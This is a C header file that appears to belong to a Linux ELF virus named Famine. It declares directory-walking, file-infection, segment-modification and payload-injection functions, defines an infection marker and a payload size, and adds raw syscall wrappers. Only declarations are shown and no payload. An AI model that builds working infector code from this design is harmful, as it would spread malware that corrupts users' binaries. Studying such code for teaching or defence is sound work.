#ifndef FAMINE_H
#define FAMINE_H

////////////////////////////////////////////////////////////////////////////////
/// INCLUDES 
////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <sys/mman.h>
#include <elf.h>

////////////////////////////////////////////////////////////////////////////////
/// DEFINES
////////////////////////////////////////////////////////////////////////////////

#define ELF_MAGIC_SIZE 4
#define ELF_MAGIC_NUMBER 1179403647
#define INFECTED_MAGIC_NUMBER 0x15D25

#define PAYLOAD_SIZE 708

#define X86_64 2

#define FILE_TYPE 8
#define DIR_MAX 12

#define BUFF_SIZE 1024*1024*5

////////////////////////////////////////////////////////////////////////////////
/// STRUCTURES
////////////////////////////////////////////////////////////////////////////////

struct linux_dirent64
{
	unsigned long long d_ino;
	unsigned long long d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

struct directory
{
	const char path[DIR_MAX];
	char buf[PATH_MAX];
	int size;
};

struct elf
{
	void *ptr;
	unsigned long long size;

	Elf64_Phdr *note;
	Elf64_Phdr *data;

	unsigned long long addr_padding;
	unsigned long long offs_padding;
};

struct criteria
{
	bool (*f)(const Elf64_Ehdr *header);
};

////////////////////////////////////////////////////////////////////////////////
/// PROTOTYPES 
////////////////////////////////////////////////////////////////////////////////

// FAMINE_C
void famine(struct directory *dir);

// INFECT_C
__attribute__((hot)) void infect_file(const char *filename);

// SEGMENTS_C
void modify_segments(struct elf *file);

// HEADER_C
void modify_header(struct elf *file);

// INJECT_C
void inject(const struct elf *file, const char *filename);

// FILE_C
struct elf get_file(const char *str);

// INLINE_C
int _open(const char *pathname, int flags, long mode);
int _close(int fd);
int _write(int fd, const void *buf, long count);
int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
int _stat(const char *pathname, struct stat *statbuf);
int _getuid(void);
void *_mmap(void *addr, unsigned long length, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long offset);
int _munmap(void *addr, unsigned long length);
int _rename(const char *oldpath, const char *newpath);

// UTILS_C
unsigned long _strlen(const char *str);
void _bzero(char *str, const unsigned long index);
int _strcmp(const char *s1, const char *s2);


#endif
